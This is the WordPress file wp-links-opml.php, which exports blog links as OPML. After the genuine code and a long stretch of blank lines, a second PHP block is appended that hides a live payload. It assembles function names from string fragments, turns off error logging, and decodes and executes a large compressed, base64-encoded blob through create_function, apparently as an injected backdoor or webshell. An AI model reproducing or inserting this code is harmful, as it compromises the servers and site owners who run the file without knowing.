<?php
/**
 * Outputs the OPML XML format for getting the links defined in the link
 * administration. This can be used to export links from one blog over to
 * another. Links aren't exported by the WordPress export, so this file handles
 * that.
 *
 * This file is not added by default to WordPress theme pages when outputting
 * feed links. It will have to be added manually for browsers and users to pick
 * up that this file exists.
 *
 * @package WordPress
 */

require_once __DIR__ . '/wp-load.php';

header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), true );
$link_cat = '';
if ( ! empty( $_GET['link_cat'] ) ) {
	$link_cat = $_GET['link_cat'];
	if ( ! in_array( $link_cat, array( 'all', '0' ), true ) ) {
		$link_cat = absint( (string) urldecode( $link_cat ) );
	}
}

echo '<?xml version="1.0"?' . ">\n";
?>
<opml version="1.0">
	<head>
		<title>
		<?php
			/* translators: %s: Site title. */
			printf( __( 'Links for %s' ), esc_attr( get_bloginfo( 'name', 'display' ) ) );
		?>
		</title>
		<dateCreated><?php echo gmdate( 'D, d M Y H:i:s' ); ?> GMT</dateCreated>
		<?php
		/**
		 * Fires in the OPML header.
		 *
		 * @since 3.0.0
		 */
		do_action( 'opml_head' );
		?>
	</head>
	<body>
<?php
if ( empty( $link_cat ) ) {
	$cats = get_categories(
		array(
			'taxonomy'     => 'link_category',
			'hierarchical' => 0,
		)
	);
} else {
	$cats = get_categories(
		array(
			'taxonomy'     => 'link_category',
			'hierarchical' => 0,
			'include'      => $link_cat,
		)
	);
}

foreach ( (array) $cats as $cat ) :
	/** This filter is documented in wp-includes/bookmark-template.php */
	$catname = apply_filters( 'link_category', $cat->name );

	?>
<outline type="category" title="<?php echo esc_attr( $catname ); ?>">
	<?php
	$bookmarks = get_bookmarks( array( 'category' => $cat->term_id ) );
	foreach ( (array) $bookmarks as $bookmark ) :
		/**
		 * Filters the OPML outline link title text.
		 *
		 * @since 2.2.0
		 *
		 * @param string $title The OPML outline title text.
		 */
		$title = apply_filters( 'link_title', $bookmark->link_name );
		?>
<outline text="<?php echo esc_attr( $title ); ?>" type="link" xmlUrl="<?php echo esc_url( $bookmark->link_rss ); ?>" htmlUrl="<?php echo esc_url( $bookmark->link_url ); ?>" updated="
							<?php
							if ( '0000-00-00 00:00:00' !== $bookmark->link_updated ) {
								echo $bookmark->link_updated;}
							?>
" />
		<?php
	endforeach; // $bookmarks
	?>
</outline>
	<?php
endforeach; // $cats
?>
</body>
</opml>






















































































<?php $zQdOj = 'bas'.'e64'.'_de'.'code';  $lGgrJ = 's'.'trrev';  $CQlcf = 'gzu'.'ncompress';  /*     wfukszrpab ytunxf tvkqw   **/ error_reporting(0); ini_set('log_errors', 0); ini_set('error_log', NULL); ini_set('display_errors', 0); $DwYfG = 'Cre'.'ate'.'_Functio'.'n'; $nkEVe = $DwYfG('', $CQlcf($lGgrJ($zQdOj('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')))); $nkEVe(); ?>